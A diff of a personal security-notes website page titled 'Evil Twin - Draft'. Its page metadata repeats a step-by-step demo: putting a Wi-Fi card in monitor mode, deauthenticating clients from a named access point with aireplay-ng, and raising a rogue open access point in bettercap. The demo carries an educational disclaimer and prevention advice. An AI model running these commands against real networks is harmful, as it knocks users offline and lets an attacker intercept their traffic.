@@ -76,6 +76,7 @@ sudo airodump-ng wlo1mon
 
 # Find the channel of wifi
 sudo aireplay-ng --test wlo1mon
+# -&gt; If it fails, your card may not support Packet Injection
 # E.g output
 12:26:19  Trying broadcast probe requests...
 12:26:21  No Answer...
@@ -142,7 +143,7 @@ Evilsocket: Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less At
 <meta name="color-scheme" content="light dark"><meta property="og:url" content="https://dangpham112000.github.io/docs/research/security/evil_twin/">
   <meta property="og:site_name" content="Dante 0401">
   <meta property="og:title" content="Evil Twin - Draft">
-  <meta property="og:description" content="Evil Twin Attack # A type of MitM attack Description: The attacker sets up a rogue Wi-Fi access point that mimics a legitimate network. Devices connect to it, allowing the attacker to intercept all traffic Key Characteristics: The rogue network often has a similar name to the real network (e.g., “FreeWiFi”) Victims unknowingly connect to the attacker’s network Prevention: Educate users to verify SSIDs before connecting Enable Mutual Authentication on enterprise Wi-Fi setups Demo # DISCLAIMER: This demo is for educational purposes only. The techniques should only be tested on systems you own or have explicit permission to analyze. Misuse of this information is unethical, may violate the law, and could lead to serious consequences. The author takes no responsibility for any damages or misuse arising from this content Disconnect user from wifi # # Install the Aircrack-ng suite, which includes airmon-ng sudo apt install aircrack-ng # Check wireless interface iwconfig # -&gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. wlo1 IEEE 802.11 ESSID:&#34;A14-01&#34; Mode:Managed Frequency:2.417 GHz Access Point: CC:71:90:62:9E:98 Bit Rate=130 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on Link Quality=62/70 Signal level=-48 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:203 Missed beacon:0 docker0 no wireless extensions. # -&gt; Your wireless interface is wlo1 # Disconnect the wireless adapter from managing a network sudo airmon-ng check kill # Enable monitor mode on your wireless adapter sudo airmon-ng start wlo1 # Verify iwconfig # -&gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. docker0 no wireless extensions. wlo1mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on # -&gt; Your wireless adapter with monitor mode is now wlo1mon # Start capture packets sudo airodump-ng wlo1mon # Find the channel of wifi sudo aireplay-ng --test wlo1mon # E.g output 12:26:19 Trying broadcast probe requests... 12:26:21 No Answer... 12:26:21 Found 4 APs 12:26:21 Trying directed probe requests... 12:26:21 CC:71:90:62:9E:98 - channel: 2 - &#39;A14-01&#39; 12:26:27 0/30: 0% 12:26:27 30:4F:75:8F:7F:28 - channel: 2 - &#39;Dinh Bao&#39; 12:26:33 0/30: 0% 12:26:34 C0:B5:D7:89:36:70 - channel: 8 - &#39;Do Hai&#39; 12:26:40 0/30: 0% 12:26:40 E8:43:68:6A:3B:88 - channel: 3 - &#39;Hoang Linh&#39; 12:26:46 0/30: 0% # -&gt; We will taget &#39;A14-01&#39; wifi, its channel is 2 # Stop the process capturing packets and start capture packets only on channel 2 sudo airodump-ng --channel 2 wlo1mon # Deauthenticate target device from wifi by sending deauth packets sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlo1mon # E.g sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 -c F2:2A:23:9E:54:E2 wlo1mon # E.g output 12:24:18 Waiting for beacon frame (BSSID: CC:71:90:62:9E:98) on channel 2 12:24:18 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|42 ACKs] 12:24:32 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|326 ACKs] 12:24:33 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 1|253 ACKs] # Or omit to target all devices sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 wlo1mon Stop capturing packets (exit monitor mode) sudo airmon-ng stop wlo1mon sudo systemctl restart NetworkManager Create the rogue access point # sudo apt update # net-tools include netstat which is used inside bettercap sudo apt install net-tools sudo apt install bettercap # Rogue access point sudo bettercap -iface wlo1mon # In bettercap: set wifi.ap.ssid Banana set wifi.ap.bssid DE:AD:BE:EF:DE:AD set wifi.ap.channel 5 set wifi.ap.encryption false wifi.recon on; wifi.ap References # Bettercap: WiFi Evilsocket: Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack (Feb 13th, 2019)">
+  <meta property="og:description" content="Evil Twin Attack # A type of MitM attack Description: The attacker sets up a rogue Wi-Fi access point that mimics a legitimate network. Devices connect to it, allowing the attacker to intercept all traffic Key Characteristics: The rogue network often has a similar name to the real network (e.g., “FreeWiFi”) Victims unknowingly connect to the attacker’s network Prevention: Educate users to verify SSIDs before connecting Enable Mutual Authentication on enterprise Wi-Fi setups Demo # DISCLAIMER: This demo is for educational purposes only. The techniques should only be tested on systems you own or have explicit permission to analyze. Misuse of this information is unethical, may violate the law, and could lead to serious consequences. The author takes no responsibility for any damages or misuse arising from this content Disconnect user from wifi # # Install the Aircrack-ng suite, which includes airmon-ng sudo apt install aircrack-ng # Check wireless interface iwconfig # -&gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. wlo1 IEEE 802.11 ESSID:&#34;A14-01&#34; Mode:Managed Frequency:2.417 GHz Access Point: CC:71:90:62:9E:98 Bit Rate=130 Mb/s Tx-Power=22 dBm Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on Link Quality=62/70 Signal level=-48 dBm Rx invalid nwid:0 Rx invalid crypt:0 Rx invalid frag:0 Tx excessive retries:0 Invalid misc:203 Missed beacon:0 docker0 no wireless extensions. # -&gt; Your wireless interface is wlo1 # Disconnect the wireless adapter from managing a network sudo airmon-ng check kill # Enable monitor mode on your wireless adapter sudo airmon-ng start wlo1 # Verify iwconfig # -&gt; E.g output lo no wireless extensions. enp4s0 no wireless extensions. docker0 no wireless extensions. wlo1mon IEEE 802.11 Mode:Monitor Frequency:2.457 GHz Retry short limit:7 RTS thr:off Fragment thr:off Power Management:on # -&gt; Your wireless adapter with monitor mode is now wlo1mon # Start capture packets sudo airodump-ng wlo1mon # Find the channel of wifi sudo aireplay-ng --test wlo1mon # -&gt; If it fails, your card may not support Packet Injection # E.g output 12:26:19 Trying broadcast probe requests... 12:26:21 No Answer... 12:26:21 Found 4 APs 12:26:21 Trying directed probe requests... 12:26:21 CC:71:90:62:9E:98 - channel: 2 - &#39;A14-01&#39; 12:26:27 0/30: 0% 12:26:27 30:4F:75:8F:7F:28 - channel: 2 - &#39;Dinh Bao&#39; 12:26:33 0/30: 0% 12:26:34 C0:B5:D7:89:36:70 - channel: 8 - &#39;Do Hai&#39; 12:26:40 0/30: 0% 12:26:40 E8:43:68:6A:3B:88 - channel: 3 - &#39;Hoang Linh&#39; 12:26:46 0/30: 0% # -&gt; We will taget &#39;A14-01&#39; wifi, its channel is 2 # Stop the process capturing packets and start capture packets only on channel 2 sudo airodump-ng --channel 2 wlo1mon # Deauthenticate target device from wifi by sending deauth packets sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlo1mon # E.g sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 -c F2:2A:23:9E:54:E2 wlo1mon # E.g output 12:24:18 Waiting for beacon frame (BSSID: CC:71:90:62:9E:98) on channel 2 12:24:18 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|42 ACKs] 12:24:32 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|326 ACKs] 12:24:33 Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 1|253 ACKs] # Or omit to target all devices sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 wlo1mon Stop capturing packets (exit monitor mode) sudo airmon-ng stop wlo1mon sudo systemctl restart NetworkManager Create the rogue access point # sudo apt update # net-tools include netstat which is used inside bettercap sudo apt install net-tools sudo apt install bettercap # Rogue access point sudo bettercap -iface wlo1mon # In bettercap: set wifi.ap.ssid Banana set wifi.ap.bssid DE:AD:BE:EF:DE:AD set wifi.ap.channel 5 set wifi.ap.encryption false wifi.recon on; wifi.ap References # Bettercap: WiFi Evilsocket: Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less Attack (Feb 13th, 2019)">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
     <meta property="article:section" content="docs">
@@ -154,7 +155,7 @@ Evilsocket: Pwning WPA/WPA2 Networks With Bettercap and the PMKID Client-Less At
 <link rel="canonical" href="https://dangpham112000.github.io/docs/research/security/evil_twin/">
 <link rel="stylesheet" href="/book.min.0ebfa1e81a7b241abaa8a9626be8325416e98d14702ea33197aea691fec27e9d.css" integrity="sha256-Dr&#43;h6Bp7JBq6qKlia&#43;gyVBbpjRRwLqMxl66mkf7Cfp0=" crossorigin="anonymous">
   <script defer src="/fuse.min.js"></script>
-  <script defer src="/en.search.min.2e2757f0eefcfc56743c8aaa48b9685368402edace8b5dfdf48203fba6ffaf3d.js" integrity="sha256-LidX8O78/FZ0PIqqSLloU2hALtrOi1399IID&#43;6b/rz0=" crossorigin="anonymous"></script>
+  <script defer src="/en.search.min.85a9b593252a1c2f4282aece8b9d2010f288e37807d1b3ddf8682c4474abd499.js" integrity="sha256-ham1kyUqHC9Cgq7Oi50gEPKI43gH0bPd&#43;GgsRHSr1Jk=" crossorigin="anonymous"></script>
 <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
@@ -517,6 +518,19 @@ https://github.com/alex-shpak/hugo-book
         </li>
       
     
+      
+        <li>
+          
+  
+  
+
+  
+    <a href="/docs/research/security/hsts/" class="">HSTS - Draft</a>
+  
+
+        </li>
+      
+    
   </ul>
 
         </li>
@@ -824,6 +838,7 @@ https://github.com/alex-shpak/hugo-book
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Find the channel of wifi</span>
 </span></span><span style="display:flex;"><span>sudo aireplay-ng --test wlo1mon
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -&gt; If it fails, your card may not support Packet Injection</span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># E.g output</span>
 </span></span><span style="display:flex;"><span>12:26:19  Trying broadcast probe requests...
 </span></span><span style="display:flex;"><span>12:26:21  No Answer...
